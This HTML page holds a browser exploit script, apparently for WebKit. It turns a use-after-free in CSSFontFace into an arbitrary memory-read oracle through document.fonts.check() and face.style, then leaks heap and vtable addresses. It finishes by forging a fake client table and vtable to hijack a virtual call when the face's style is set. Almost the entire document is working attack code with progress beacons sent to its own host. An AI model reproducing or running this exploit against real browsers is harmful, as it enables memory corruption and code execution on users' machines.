<!--
  p690: walk-forge-oracle — reproduce PR #237's iterateClients walk
  Based on vincenzoiacovone's p672-iterateclients-callback-dispatch.html

  Chain: UAF + reclaim -> check() oracle -> self-discovery -> vtable chain
         read via style-read -> MW+CW walk forge -> face.style trigger

  Oracle mechanism:
    CSSFontFace +0x20 = m_ranges data pointer. Writing address T at +0x20 with
    count=1 (+0x28) makes check() read from/to at T. Binary search on check()
    reveals byte values at any mapped address.

  Style-read mechanism:
    forge(false, addr, len) sets up the face so face.style returns the CSS
    serialization of `len` bytes at `addr`. dec() parses that back to hex.

  Walk forge (checked build, 14.10):
    +0x58 m_clients.m_table  -> self+0x98
    +0x60 m_iterators         -> {count=2, pad=8}
    +0x68 m_mutex             -> self+0x78 (fake lock)
    +0x88 deletedCount=0, +0x8C keyCount=1, +0x90 mask=0, +0x94 tableSize=1
    +0x98 bucket[0]           -> self+0xA0 (WeakPtrImpl)
    +0xA0 WeakPtrImpl         -> {rc=2, flags=0, m_ptr=self+CLI}
    +CLI  client vtable       -> VTAB+8 or self+VB

  Base shape: gt=1 rv=6 cli=184 kc=1 bk=1 mt=1 pk=9 (all safe)
  Poison test: pk=4 (fontPropertyChanged) -> crash = walk reached

  CRASH_CLASS: HIGH
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p690 walk-forge-oracle</title></head>
<body>
<div id="verdict" style="position:sticky;top:0;z-index:9;font:700 15px monospace;padding:.5rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">RUNNING</div>
<pre id="out">p690</pre>
<script>
'use strict';
var SKIPJ=-1;
var O=document.getElementById('out');
var UID=Math.random().toString(36).slice(2,8).toUpperCase();

/* --- beacon infrastructure --- */
function b(m){try{O.textContent+='\n'+m;}catch(e){}
  try{var u=location.protocol+'//'+location.host+'/beacon/P690-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID;if(navigator.sendBeacon&&navigator.sendBeacon(u))return;}catch(e){}
  try{new Image().src=location.protocol+'//'+location.host+'/beacon/P690-'+encodeURIComponent(m)+'?t='+Date.now();}catch(e){}}
function bs(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/P690-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);x.send(null);}catch(e){try{b(m+'-XLOST');}catch(e2){}}}
function verd(k,t){var v=document.getElementById('verdict');v.style.background=(k==='ok')?'#e3f5e6':'#fde2e1';v.style.color=(k==='ok')?'#0f5a20':'#8c1010';v.innerHTML=t;}

/* --- query params --- */
function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
var K=qint('k',32), RT=qint('rt',0), PK=qint('pk',9), PW=qint('pw',80), DL=qint('dl',0);
var GT=qint('gt',0), SI=qint('si',1), RV=qint('rv',6), KC=qint('kc',0), BK=qint('bk',0);
var MT=qint('mt',1), MP=qint('mp',0), IVP=qint('ivp',0);
var CLI=qint('cli',184);
var VB=(function(){var m=/[?&]vb=([0-9a-f]+)/.exec(location.search);return m?parseInt(m[1],16):0x18;})();
var SV=(function(){var m=location.search.match(/[?&]sv=([^&]*)/);return m?decodeURIComponent(m[1]):'italic';})();
var CTL=qint('ctl',0), AUTO=qint('auto',0);

var SIZE=192, fired=false, faces=null, RTT=0;

/* --- primitives --- */
function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>>8)&0xFF;u[o+2]=(x>>>16)&0xFF;u[o+3]=(x>>>24)&0xFF;}
function hex(x){return '0x'+x.toString(16);}

/* --- localStorage reset --- */
if(/[?&]reset=1/.test(location.search)){
  try{var ks=Object.keys(localStorage);for(var ri=0;ri<ks.length;ri++){if(ks[ri].indexOf('p690')===0)localStorage.removeItem(ks[ri]);}}catch(e){}
  b('RESET-FULL');document.body.innerHTML='<p style="font:700 26px monospace">p690 reset</p>';
}
else if(/[?&]soft=1/.test(location.search)){
  try{localStorage.removeItem('p690_tries');}catch(e){}
  b('SOFT');document.body.innerHTML='<p style="font:700 26px monospace">counter cleared</p>';
}
else { b('VER-1'); b('BOOT-'+UID+',ctl='+CTL); }

/* --- spray + UAF trigger --- */
function start(){
  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('NOVF');return;}
  try{document.fonts.add(vf);}catch(e){}
  try{void vf.loaded;}catch(e){}
  var fs=document.createElement('style');
  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(fs);

  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
    if(fired)return undefined;fired=true;
    if(!CTL){try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}}
    try{document.body.offsetHeight;}catch(e){}
    window.__sp=[];
    for(var k=0;k<K;k++){
      var w=new Uint8Array(new ArrayBuffer(SIZE));
      w[0x82]=3;
      w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
      window.__sp.push(w);
    }
    return undefined;
  },set:function(){}});

  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;b('RES-n'+f.length);setTimeout(phase,PW);},
                                               function(e){b('RJ-'+String(e&&e.name));});
  setTimeout(function(){if(!faces)b('NOFACES');},1500);
}

/* --- main analysis chain --- */
function phase(){
  var bufs=[],bufl1=[],L1=0n,L2=0n,rawL=null,cands=[];
  if(RT>0){RTT=setTimeout(function(){location.href=location.href.replace(/([?&])rt=\d+/,'$1rt='+(RT-1));},30000);}

  /* Step 1: hit detection + leak L1/L2 */
  for(var i=0;i<window.__sp.length;i++){
    var a=le(window.__sp[i],0x58),c=le(window.__sp[i],0x68);
    if(a>0x1000000000n){bufs.push([window.__sp[i],c]);cands.push([window.__sp[i],c]);bufl1.push(a);if(!rawL)rawL=[a,c];}
  }
  if(rawL){L1=rawL[0];L2=rawL[1];}
  b('L1-'+hex(L1));b('L2-'+hex(L2));
  if(!bufs.length||L2===0n){b('NOLEAK');verd('bad','NOLEAK');return;}

  /* Step 2: initial forge — set refcount, copy L2, clear status */
  for(var ib=0;ib<bufs.length;ib++){var vb=bufs[ib][0];vb[0]=2;put64(vb,0x08,bufs[ib][1]);vb[0x10]=0;vb[0x82]=0;}
  b('FORGED-'+bufs.length);

  /* Step 3: re-add faces, find oracle face (setTimeout chain) */
  setTimeout(function(){
    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
    b('FAMILY-OK');
    setTimeout(function(){
      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
      b('ADD-OK');
      setTimeout(function(){
        var fam=null,zi=-1;
        for(var q=0;q<faces.length;q++){var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){}if(r===false){fam='zz'+q;zi=q;window.__zi=q;break;}}
        b('INTABLE-'+fam);
        if(!fam){b('NOTIN');verd('bad','NOTIN');return;}

        /* set ranges count/capacity on all hit buffers */
        for(var is=0;is<bufs.length;is++){bufs[is][0][0x28]=1;bufs[is][0][0x2C]=1;}

        /* --- oracle functions --- */
        var self=0n,selfFound=false;

        function setR(t){for(var ir=0;ir<bufs.length;ir++){if(SKIPJ>=0&&bufs[ir][0]===window.__sp[SKIPJ])continue;put64(bufs[ir][0],0x20,t);}}
        function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c))===false;}catch(e){return null;}}
        function boundary(tgt){
          setR(tgt);
          if(chk(0)!==true)return -1;
          var lo=0,hi=0x10FFFF,res=-1;
          while(lo<=hi){var mid=(lo+hi)>>1;var r=chk(mid);if(r===null)break;if(r===true){res=mid;lo=mid+1;}else hi=mid-1;}
          return res;
        }

        /* --- style-read mechanism --- */
        var TGT=self+0xA0n;
        function forgeRead(daddr,dlen){
          for(var ib2=0;ib2<window.__sp.length;ib2++){
            var vb2=window.__sp[ib2];if(!vb2)continue;
            if(SKIPJ>=0&&ib2===SKIPJ)continue;
            if(selfFound){put64(vb2,0x08,self+0x70n);vb2[0x10]=0;}
            put32(vb2,0x30,4);put32(vb2,0x34,dlen);put64(vb2,0x38,daddr);put32(vb2,0x40,4);
            vb2[0x44]=0x7A;vb2[0x45]=0x7A;vb2[0x46]=0x71;
            put32(vb2,0x70,4);
            put32(vb2,0x74,0x10);vb2[0x78]=14;vb2[0x79]=0;
            if(selfFound)put64(vb2,0x7A,self+0x90n);
            put32(vb2,0x90,3);put32(vb2,0x94,72);
            if(selfFound)put64(vb2,0x98,self+0x30n);
          }
        }
        function dec(s,lim){
          var by=[],q2=(s.charAt(0)==='"')?1:0,e=(s.slice(-1)==='"')?s.length-1:s.length,k=q2;
          while(k<e&&by.length<lim){var ch=s.charAt(k);
            if(ch==='\\'){k++;var hh='';while(k<e&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k))){hh+=s.charAt(k);k++;}
              if(hh.length===0){if(k<e){by.push(s.charCodeAt(k));k++;}}
              else{if(s.charAt(k)===' ')k++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
            else{by.push(s.charCodeAt(k));k++;}}
          var h='';for(var j=0;j<by.length;j++)h+=('0'+by[j].toString(16)).slice(-2);return h;
        }
        function readStyle(){
          if(zi<0)return '';
          try{return dec(String(faces[zi].style),128);}catch(e){return 'THROW';}
        }
        function readLeHex(hexStr,off){
          var s=hexStr.slice(off*2,off*2+16);
          if(!/^[0-9a-f]{16}$/.test(s))return 0n;
          return BigInt('0x'+s.match(/../g).reverse().join(''));
        }

        /* --- Step 4: oracle validation --- */
        var t1=-1,l2i=-1;
        /* diag: pre-oracle state */
        b('DIAG-bufs='+bufs.length+',fam='+fam+',zi='+zi);
        for(var q8=0;q8<bufs.length;q8++){
          L1=bufl1[q8];L2=bufs[q8][1];
          var dCnt=bufs[q8][0][0x28],dCap=bufs[q8][0][0x2C];
          b('DIAG-q'+q8+'-L2='+hex(L2)+',cnt='+dCnt+',cap='+dCap);
          /* test chk raw before boundary */
          setR(L2+0x07n);
          var dc0=chk(0),dc1=chk(0x41),dc2=chk(0x100);
          b('DIAG-q'+q8+'-chk0='+dc0+',chk41='+dc1+',chk100='+dc2);
          var d20=hex(le(bufs[q8][0],0x20));
          b('DIAG-q'+q8+'-ptr20='+d20);
          t1=boundary(L2+0x07n);
          if(t1>=0){l2i=q8;break;}
        }
        if(l2i>0)b('L2SEL-'+l2i);
        if(l2i<0){L1=bufl1[0];L2=bufs[0][1];}

        var oracleAlive=(t1>=0);
        if(!oracleAlive){
          b('A-DEAD');
          for(var ipd=0;ipd<bufs.length;ipd++){var vpd=bufs[ipd][0];
            vpd[0x38]=0x00;vpd[0x39]=0x10;vpd[0x3A]=0x00;vpd[0x3B]=0x00;
            vpd[0x3C]=0x00;vpd[0x3D]=0x20;vpd[0x3E]=0x00;vpd[0x3F]=0x00;}
        }
        var t2=-1,c0=false;
        if(oracleAlive){
          b('HIGH-0x'+t1.toString(16));
          t2=boundary(L2+0x06n);
          if(t2<0){b('B-DEAD');}else{b('B2-0x'+(t2&0xFF).toString(16));}
          setR(L2+0x05n);
          c0=chk(0);
          b('B0CLASS-'+(c0===true?'lo-hi':(c0===false?'mid':'?')));
        }

        /* --- Step 5: Phase 2 — Client scan --- */
        var B2=BigInt((t2>=0)?(t2&0xFF):Number((L2>>16n)&0xFFn));
        var B2L=Number((L2>>16n)&0xFFn);
        var fromExp=BigInt(B2L)|0x100000n;
        var B0s=(c0===false)?[0x10,0x20,0x30,0x40,0x50,0x60,0x70]:[0x00,0x80,0x90,0xa0,0xb0,0xc0,0xd0,0xe0,0xf0];
        var found=0n,ntry=0;
        b('PH2-START-b0='+B0s.length);

        /* check localStorage cache */
        try{var pv=BigInt('0x'+(localStorage.getItem('p690_cli')||'0'));
          if(pv>0x1000000000n){setR(pv+0x0Bn);if(chk(0x1000)===true&&chk(0xFFF)===false){found=pv;b('CLIENT-CACHED-0x'+pv.toString(16));}}}catch(e){}

        var b1L=Number((L2>>8n)&0xFFn);
        var ST=null;try{ST=JSON.parse(localStorage.getItem('p690_st')||'null');}catch(e){}
        var startI=0;
        if(ST&&ST.B2===Number(B2)&&ST.b1L===b1L&&ST.c0===(c0===false)){
          startI=(ST.i|0);if(startI>4)startI-=4;b('PH2-RESUME-'+startI);
        }else{b('PH2-FRESH');startI=0;try{localStorage.setItem('p690_st',JSON.stringify({B2:Number(B2),b1L:b1L,c0:(c0===false),i:0}));}catch(e){}}

        var B1s=[];for(var q1=0;q1<256;q1++)B1s.push(q1);
        B1s.sort(function(x,y){return Math.abs(x-b1L)-Math.abs(y-b1L);});

        if(found===0n&&oracleAlive){
          for(var i5=0;i5<B0s.length;i5++){
            var brk=false;
            for(var q2b=0;q2b<256;q2b++){
              var b1=B1s[q2b];
              var cand=BigInt(B0s[i5])|(BigInt(b1)<<8n)|(B2<<16n)|(0x10n<<32n);
              if(ntry<startI){ntry++;continue;}
              setR(cand+0x0Bn);ntry++;
              if((ntry&7)===0){try{localStorage.setItem('p690_st',JSON.stringify({B2:Number(B2),b1L:b1L,c0:(c0===false),i:ntry}));}catch(e){}}
              if(chk(0x1000)===true&&chk(0xFFF)===false){
                setR(cand+0x0An);
                var s1=chk(Number(fromExp&0x1FFFFFn));
                b('CAND-0x'+cand.toString(16)+',s1='+s1);
                if(s1===true){found=cand;brk=true;break;}
              }
              if((ntry%64)===0)b('PH2-'+ntry);
            }
            if(brk)break;
          }
        }
        b('PH2-END-ntry='+ntry);
        if(!found){
          if(oracleAlive){b('NOCLIENT');try{localStorage.removeItem('p690_st');}catch(e){}verd('bad','NOCLIENT');return;}
          b('PH2-SKIP-DEAD');
        }else{
          try{localStorage.removeItem('p690_st');}catch(e){}
          try{localStorage.setItem('p690_cli',found.toString(16));}catch(e){}
          b('CLIENT-0x'+found.toString(16));
        }

        /* --- Step 6: Phase 3 — Self scan --- */
        /* write marker {from=0x1000, to=0x2000} at +0x38 in ALL buffers */
        for(var ip=0;ip<bufs.length;ip++){var vp=bufs[ip][0];
          vp[0x38]=0x00;vp[0x39]=0x10;vp[0x3A]=0x00;vp[0x3B]=0x00;
          vp[0x3C]=0x00;vp[0x3D]=0x20;vp[0x3E]=0x00;vp[0x3F]=0x00;}

        /* fast path: derive self from client */
        if(!selfFound&&found){
          setR(found+0x48n);
          if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
            self=found+0x10n;selfFound=true;b('SELF-DER-0x'+self.toString(16));
          }
        }

        /* full scan if fast path missed */
        if(!selfFound){
          var b2Ref=(found>0n)?Number((found>>16n)&0xFFn):Number((L2>>16n)&0xFFn);
          var b4Ref=(found>0n)?Number((found>>32n)&0xFFn):Number((L2>>32n)&0xFFn);
          var B4s=[b4Ref];
          var b4all=[0x10,0x08];
          for(var q8b=0x09;q8b<=0x0F;q8b++)b4all.push(q8b);
          for(var q9=0x11;q9<=0x1F;q9++)b4all.push(q9);
          for(var qw=0;qw<b4all.length;qw++){if(b4all[qw]!==b4Ref)B4s.push(b4all[qw]);}

          var b2s=[];for(var q5=0;q5<256;q5++)b2s.push(q5);
          b2s.sort(function(x,y){return Math.abs(x-b2Ref)-Math.abs(y-b2Ref);});
          var b0a=[];for(var q6=0;q6<16;q6++)b0a.push(q6*16);

          var dead=[];try{dead=JSON.parse(localStorage.getItem('p690_dead')||'[]');}catch(e){}
          var s3=null;try{s3=JSON.parse(localStorage.getItem('p690_s3')||'null');}catch(e){}
          var resumeKey=(found>0n)?found.toString(16):L2.toString(16);
          var st3=0;if(s3&&s3.cli===resumeKey){st3=(s3.i|0);if(st3>0)st3++;b('PH3-RESUME-'+st3);}
          var n3=0,WSZ=(0x7F*16);
          b('PH3-START-b4='+B4s[0]);

          for(var i8=0;i8<B4s.length&&!selfFound;i8++){
            for(var i7=0;i7<b2s.length&&!selfFound;i7++){
              var winB2=b2s[i7];
              if(dead.indexOf(B4s[i8]*1000+winB2)>=0){n3+=WSZ;continue;}
              if(st3>n3+WSZ){n3+=WSZ;continue;}
              for(var q7=0;q7<0x7F&&!selfFound;q7++){
                for(var i6=0;i6<b0a.length&&!selfFound;i6++){
                  var sc=BigInt(b0a[i6])|(BigInt(q7)<<8n)|(BigInt(winB2)<<16n)|(BigInt(B4s[i8])<<32n);
                  if(n3<st3){n3++;continue;}
                  setR(sc+0x38n);n3++;
                  if((n3&3)===0){try{localStorage.setItem('p690_s3',JSON.stringify({cli:resumeKey,i:n3}));}catch(e){}}
                  if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
                    self=sc;selfFound=true;
                  }
                  if((n3%512)===0)b('PH3-'+n3);
                }
              }
            }
          }
        }

        if(!selfFound){b('NOSELF');try{localStorage.removeItem('p690_s3');}catch(e){}verd('bad','NOSELF');return;}
        b('SELF-0x'+self.toString(16));
        if(RTT){clearTimeout(RTT);RTT=0;}
        try{localStorage.removeItem('p690_s3');localStorage.removeItem('p690_dead');}catch(e){}

        /* Write VTAB oracle marker {from=0, to=0x1000+k} at +0x40 in non-reclaimed bufs.
           Offset 0x40 lands on the 64-byte search grid (self ± N*64) — the original +0x00
           bytes have from=0x80000000 (the 0x80 refcount guard) which kills UnicodeRange. */
        for(var iv=0;iv<window.__sp.length;iv++){
          if(le(window.__sp[iv],0x58)>0x1000000000n)continue;
          var wv=window.__sp[iv],mk=0x1000+iv;
          wv[0x40]=0;wv[0x41]=0;wv[0x42]=0;wv[0x43]=0;
          wv[0x44]=mk&0xFF;wv[0x45]=(mk>>8)&0xFF;wv[0x46]=0;wv[0x47]=0;
        }

        /* --- Step 7: VTAB search — find a separate spray buffer for vtable --- */
        var VTAB=0n;
        for(var sv=1;sv<=256&&VTAB===0n;sv++){
          var cd=self-BigInt(sv*64);
          setR(cd);
          if(chk(0x1000)===true&&chk(0x1001)===false){
            var jj=Number(boundary(cd))-0x1000;
            if(jj>=0&&jj<K){VTAB=cd;SKIPJ=jj;b('VTAB-0x'+cd.toString(16)+'-j'+jj);break;}
          }
        }
        if(VTAB===0n){
          for(var sv2=1;sv2<=256&&VTAB===0n;sv2++){
            var cu=self+BigInt(sv2*64);
            setR(cu);
            if(chk(0x1000)===true&&chk(0x1001)===false){
              var jj2=Number(boundary(cu))-0x1000;
              if(jj2>=0&&jj2<K){VTAB=cu;SKIPJ=jj2;b('VTAB-0x'+cu.toString(16)+'-j'+jj2);break;}
            }
          }
        }
        if(VTAB===0n)b('VTAB-NONE');

        /* --- style-read helpers --- */
        function updateTarget(daddr,dlen){
          for(var ib2=0;ib2<window.__sp.length;ib2++){
            var vb2=window.__sp[ib2];if(!vb2)continue;
            if(SKIPJ>=0&&ib2===SKIPJ)continue;
            put32(vb2,0x34,dlen);put64(vb2,0x38,daddr);
          }
        }
        /* restore buffer to post-forgeRead state then re-forge with new target */
        function restoreAndForge(snap2,daddr,dlen){
          for(var ib3=0;ib3<window.__sp.length;ib3++){
            var vb3=window.__sp[ib3];if(!vb3)continue;
            if(SKIPJ>=0&&ib3===SKIPJ)continue;
            for(var dd2=0;dd2<SIZE;dd2++)vb3[dd2]=snap2[dd2];
          }
          forgeRead(daddr,dlen);
        }
        function dumpBuf(tag,v){
          var s='';for(var dd=0;dd<16;dd++)s+=('0'+v[dd].toString(16)).slice(-2);
          bs(tag+'-00='+s);
          s='';for(var dd=0x70;dd<0x82;dd++)s+=('0'+v[dd].toString(16)).slice(-2);
          bs(tag+'-70='+s);
        }

        /* --- Step 8: W1 vtable chain read --- */
        b('W1-START-si='+SI);
        /* snapshot buffer BEFORE readStyle */
        var snap=new Uint8Array(SIZE);
        if(bufs.length>0)for(var sn=0;sn<SIZE;sn++)snap[sn]=bufs[0][0][sn];
        forgeRead(L1-0x10n,80);
        /* snapshot AFTER forgeRead but BEFORE readStyle */
        var snap2=new Uint8Array(SIZE);
        if(bufs.length>0)for(var s2a=0;s2a<SIZE;s2a++)snap2[s2a]=bufs[0][0][s2a];
        setTimeout(function(){
          bs('W1-PRE-RD');
          var hw=readStyle();
          bs('W1-POST-RD');
          b('W1-RAW-'+hw.slice(0,40));
          /* diff: which bytes did the engine change during readStyle? */
          if(bufs.length>0){var df='';for(var dd=0;dd<SIZE;dd++){if(bufs[0][0][dd]!==snap2[dd])df+=dd.toString(16)+':'+snap2[dd].toString(16)+'>'+bufs[0][0][dd].toString(16)+',';}bs('W1-DIFF-'+df.slice(0,200));}

          /* find IM: first heap pointer at SI-th position */
          var IM=0n,seen=0;
          for(var gb=2;gb<10;gb++){
            var hb=hw.slice(gb*16,gb*16+16);
            if(/^[0-9a-f]{16}$/.test(hb)){
              var cv=BigInt('0x'+hb.match(/../g).reverse().join(''));
              if(cv>0x1000000000n&&cv<0xFFFFFFFFFFFFFFFFn){if(seen===SI){IM=cv;break;}seen++;}
            }
          }
          b('W1-IM-'+hex(IM));
          if(IM===0n){b('W1-NOBUCKET');verd('bad','W1 NOBUCKET');return;}

          /* read vptr from IM+8 — restore buffer then re-forge with new target */
          bs('W2-UPD');
          restoreAndForge(snap2,IM+8n,16);
          setTimeout(function(){
            bs('W2-PRE-RD');
            var h2=readStyle();
            bs('W2-POST-RD');
            var hf=h2.slice(0,16);
            if(!/^[0-9a-f]{16}$/.test(hf)){b('W1-BADVP-'+h2.slice(0,32));verd('bad','W1-BADVP');return;}
            var FO=BigInt('0x'+hf.match(/../g).reverse().join(''));
            b('FPTR-'+hex(FO));

            /* read FO to get vptr and possibly self2 */
            bs('W3-UPD');
            restoreAndForge(snap2,FO,32);
            setTimeout(function(){
              bs('W3-PRE-RD');
              var h3=readStyle();
              bs('W3-POST-RD');
              var hv=h3.slice(0,16),hz=h3.slice(32,48);
              b('RWD-'+hv+'|'+hz);
              if(!/^[0-9a-f]{16}$/.test(hv)){b('OBJ-BAD');verd('bad','OBJ-BAD');return;}

              /* optional self refinement from the wrapper chain */
              if(/^[0-9a-f]{16}$/.test(hz)){
                var s2=BigInt('0x'+hz.match(/../g).reverse().join(''));
                if(s2>0x1000000000n&&s2<0x10000000000n){self=s2;b('SELF2-'+hex(s2));}
              }
              if(RTT){clearTimeout(RTT);RTT=0;}
              TGT=self+0xA0n;

              var VP=BigInt('0x'+hv.match(/../g).reverse().join(''));
              b('VPTR-'+hex(VP));

              /* read vtable slots: VP+0x00 gives slots 0-5 (48 bytes / 6 slots) */
              bs('W4-UPD');
              restoreAndForge(snap2,VP,48);
              setTimeout(function(){
                bs('W4-PRE-RD');
                var h4=readStyle();
                bs('W4-POST-RD');
                b('VT-RAW-'+h4.slice(0,96));
                if(h4.length<96){b('VT-SHORT');verd('bad','VT-SHORT');return;}

                var S0=readLeHex(h4,0);  /* slot 0: ~complete dtor */
                var S1=readLeHex(h4,8);  /* slot 1: ~deleting dtor */
                var S2=readLeHex(h4,16); /* slot 2: fontLoaded (safe no-op) */
                var S3=readLeHex(h4,24); /* slot 3: fontStateChanged */
                var Q4=readLeHex(h4,32); /* slot 4: fontPropertyChanged */
                var R5=readLeHex(h4,40); /* slot 5: past-end or extra */
                b('VT-s0='+hex(S0)+',s1='+hex(S1)+',s2='+hex(S2));
                b('VT-s3='+hex(S3)+',s4='+hex(Q4)+',s5='+hex(R5));
                var R6=S2; /* use fontLoaded as safe fill — empty base impl */

                /* class gate: fontPropertyChanged should be a valid code ptr */
                if(GT&&Q4===0n){
                  b('RETRY-GT');
                  if(RT>0){setTimeout(function(){location.href=location.href.replace(/([?&])rt=\d+/,'$1rt='+(RT-1));},60);}
                  return;
                }

                /* --- Step 9: Walk forge (lay) --- */
                setTimeout(function(){
                  b('LAY-IN');
                  try{
                    /* restore snap2 first — buffer is dirty from W4 forgeRead/readStyle */
                    for(var kc2=0;kc2<window.__sp.length;kc2++){
                      var wc=window.__sp[kc2];if(!wc)continue;
                      if(SKIPJ>=0&&kc2===SKIPJ)continue;
                      for(var dd2=0;dd2<SIZE;dd2++)wc[dd2]=snap2[dd2];

                      put64(wc,0x08,self+0x60n);wc[0x10]=0;

                      /* vtable entries at VB..VB+7*8 — fill with fontLoaded (safe no-op) */
                      for(var kk=0;kk<8;kk++){
                        var of2=VB+8*kk;
                        if(of2===0x10)continue;
                        var val=(kk===PK)?0x4141414141414141n:R6;
                        put64(wc,of2,val);
                      }

                      put64(wc,0x58,MT?self+0x98n:0n);
                      /* inline HashTable metadata (if used by this WebKit era) */
                      put32(wc,0x60,1);put32(wc,0x64,0);
                      put32(wc,0x68,KC);put32(wc,0x6C,0);
                      put32(wc,0x70,1);put32(wc,0x74,0);
                      put32(wc,0x88,0);put32(wc,0x8C,KC);
                      put32(wc,0x90,0);put32(wc,0x94,1);
                      put64(wc,0x98,BK?self+0xA0n:0n);
                      put32(wc,0xA0,2);put32(wc,0xA4,0);
                      /* m_ptr: client in SKIPJ if available, else self+CLI */
                      if(VTAB>0n&&!MP){
                        put64(wc,0xA8,VTAB+0x88n);
                      }else{
                        put64(wc,0xA8,MP?0n:self+BigInt(CLI));
                        put64(wc,0xB8,2n);
                        if(CLI){
                          put64(wc,CLI,IVP?0x4141414141414141n:(VTAB>0n?VTAB+0x08n:self+BigInt(VB)));
                          put64(wc,0xA8,self+BigInt(CLI));
                        }
                      }
                    }

                    /* fill SKIPJ buffer as external vtable + client object */
                    if(VTAB>0n&&SKIPJ>=0){
                      var sk=window.__sp[SKIPJ];
                      for(var jv=0;jv<16;jv++){
                        put64(sk,8+jv*8,(jv===PK?0x4141414141414141n:R6));
                      }
                      /* client object at SKIPJ+0x88 with safe refcount zone.
                         ref() this-adjusts ±8; fill 0x80-0xBF so any landing is safe */
                      for(var zz=0x80;zz<0xC0;zz++)sk[zz]=0;
                      put32(sk,0x80,2); /* refcount if adjustment = -8 */
                      put64(sk,0x88,VTAB+0x08n); /* vtable pointer */
                      put32(sk,0x90,2); /* refcount if adjustment = +8 or 0 */
                    }
                    b('LAY-OK-cli='+(VTAB>0n?'SKIPJ+88':'self+'+CLI)+',fill='+hex(R6)+',bk='+BK+',kc='+KC);
                  }catch(eL){b('LAY-ERR-'+String(eL&&eL.message||eL).slice(0,60));}

                  verd('ok','SELF='+hex(self)+'<br>VP='+hex(VP)+'<br>IM='+hex(IM));

                  /* --- Step 10: Trigger --- */
                  setTimeout(function(){
                    bs('RIP2-PRE');
                    /* getter diagnostic — reads face.style without setting */
                    try{var sg=faces[zi].style;bs('RIP2-GET-'+sg.length);}
                    catch(eG){bs('RIP2-GERR-'+String(eG&&eG.message||eG).slice(0,30));}
                    if(CTL===1){bs('RIP2-CTL1-DONE');return;}
                    /* CTL=3: zero m_table before setter to isolate walk crash */
                    if(CTL===3){
                      for(var zq=0;zq<window.__sp.length;zq++){
                        var wq=window.__sp[zq];if(!wq)continue;
                        if(SKIPJ>=0&&zq===SKIPJ)continue;
                        put64(wq,0x58,0n);
                      }
                      bs('RIP2-NULL58');
                    }
                    bs('RIP2-GO-cli'+hex(IM));
                    try{faces[zi].style=SV;bs('RIP2-AFTER');}
                    catch(e){bs('RIP2-ERR-'+String(e&&e.message||e).slice(0,40));}
                    bs('RIP2-FIN');
                  },120);

                },70);
              },70);
            },70);
          },70);
        },70);

      },60); /* post ADD-OK */
    },40); /* post FAMILY-OK */
  },60); /* post FORGED */
}

if(document.readyState==='complete'||document.readyState==='interactive')
  setTimeout(function(){if(!/reset=1|soft=1/.test(location.search))setTimeout(start,DL);},0);
else document.addEventListener('DOMContentLoaded',function(){if(!/reset=1|soft=1/.test(location.search))setTimeout(start,DL);});
</script></body></html>
